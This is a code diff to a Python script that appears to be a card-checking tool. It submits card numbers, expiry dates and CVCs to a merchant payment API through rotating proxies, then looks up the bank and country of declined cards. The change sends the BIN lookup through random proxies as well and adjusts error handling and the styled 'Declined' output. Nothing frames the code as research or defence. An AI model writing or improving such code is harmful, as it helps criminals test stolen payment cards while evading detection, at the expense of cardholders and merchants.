@@ -34,16 +34,21 @@ def generate_email(first_name, last_name):
     return email
 
 # Perform BIN lookup
-def bin_lookup(card_number):
+def bin_lookup_with_proxy(card_number, proxies):
     try:
         bin_number = card_number[:6]  # Extract first 6 digits of the card
-        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
+        proxy = get_random_proxy(proxies)  # Use a random proxy
+        response = requests.get(f"https://lookup.binlist.net/{bin_number}", proxies=proxy, timeout=10)
+        
         if response.status_code == 200:
-            return response.json()
+            return response.json()  # Return JSON response on success
         else:
+            print(f"BIN Lookup Failed: {response.status_code} - {response.text}")
             return None
-    except Exception as e:
+    except requests.RequestException as e:
+        print(f"BIN Lookup Error with Proxy: {e}")
         return None
+
 
 # Main card-checking function
 def check_card(card_number, exp_month, exp_year, cvc, proxies):
@@ -201,9 +206,9 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
         response2 = requests.post(url2, cookies=cookies, headers=headers2, json=json_data, proxies=proxy)
         api_response = response2.json()
 
-        # Check for PAYMENT_DECLINED
+          # Check for PAYMENT_DECLINED
         if api_response.get("failureType") == "PAYMENT_DECLINED":
-            bin_data = bin_lookup(card_number)
+            bin_data = bin_lookup_with_proxy(card_number, proxies)  # Use proxy for BIN lookup
             if bin_data:
                 # Format the custom response
                 return f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
@@ -216,8 +221,7 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_data.get('country', {}).get('name', 'Unknown')} {bin_data.get('country', {}).get('emoji', '')}
 """
             else:
-                # Fallback if BIN lookup fails
-                return str(api_response) 
+                return "Declined ❌ - BIN Lookup Failed."
         else:
             # Return the full response for other cases
             return str(api_response)
